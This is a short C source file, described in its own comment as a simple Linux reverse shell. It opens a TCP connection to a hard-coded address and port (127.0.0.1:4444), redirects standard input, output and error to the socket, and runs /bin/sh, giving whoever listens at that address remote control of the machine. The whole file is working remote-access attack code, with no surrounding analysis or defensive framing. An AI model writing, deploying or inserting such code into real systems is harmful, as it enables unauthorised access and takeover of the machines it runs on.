/* Simple Linux Base Reverse shell written in c */ 
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>


#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444


int main()
{
	// Create addr struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;

	addr.sin_port = htons(REMOTE_PORT);	// Connection Port
	addr.sin_addr.s_addr = inet_addr(REMOTE_ADDR);	// Connection IP

	// Create socket
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1) {
		perror("Socket creation failed.\n");
		exit(EXIT_FAILURE);
	}

	// Connect socket
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		perror("Socket connection failed.\n");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// Duplicate stdin, stdout, stderr to socket
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	//Execute shell
	execve("/bin/sh", 0, 0);
}
